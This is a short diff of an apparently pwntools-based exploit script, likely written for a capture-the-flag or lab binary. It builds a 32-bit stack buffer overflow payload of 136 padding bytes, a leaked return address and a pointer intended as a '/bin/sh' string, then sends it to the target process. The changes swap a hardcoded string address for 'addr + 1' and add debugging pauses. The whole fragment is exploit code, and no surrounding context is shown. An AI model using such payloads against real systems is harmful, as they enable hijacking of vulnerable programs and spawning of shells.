@@ -11,7 +11,9 @@ print(hex(addr))
 
 input()
 
-binsh = int("0x0804A028", 16)
+# binsh = int("0x0804A028", 16)
+binsh = addr + 1
+print(hex(binsh))
 
 pay = b""
 pay += b"\x90" * 136
@@ -19,6 +21,8 @@ pay += b"\x90" * 4
 pay += p32(addr)
 pay += b"\x90" * 4
 pay += p32(binsh)
+
+input()
 
 p.send(pay)
 
